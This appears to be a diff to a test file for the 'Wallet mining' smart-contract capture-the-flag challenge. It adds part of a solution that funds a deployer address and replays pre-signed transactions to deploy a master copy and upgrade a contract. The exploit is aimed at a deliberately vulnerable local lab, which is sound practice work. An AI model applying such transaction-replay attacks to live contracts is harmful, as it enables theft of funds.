@@ -115,6 +115,21 @@ describe("[Challenge] Wallet mining", function () {
     //   mockSigner.address,
     //   ethers.utils.parseEther("100")
     // );
+    let tx, res, deployer3;
+    deployer3 = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
+    tx = {
+      from: player.address,
+      to: deployer3,
+      value: ethers.utils.parseEther("1"),
+    };
+
+    await player.sendTransaction(tx);
+
+    let DeployedFactory, deployedFactory, deployedCopy;
+    deployedCopy = await (await ethers.provider.sendTransaction(Copy)).wait();
+    console.log("MasterCopy deployed at", deployedCopy.contractAddress);
+
+    await (await ethers.provider.sendTransaction(Upgrade)).wait();
   });
 
   after(async function () {
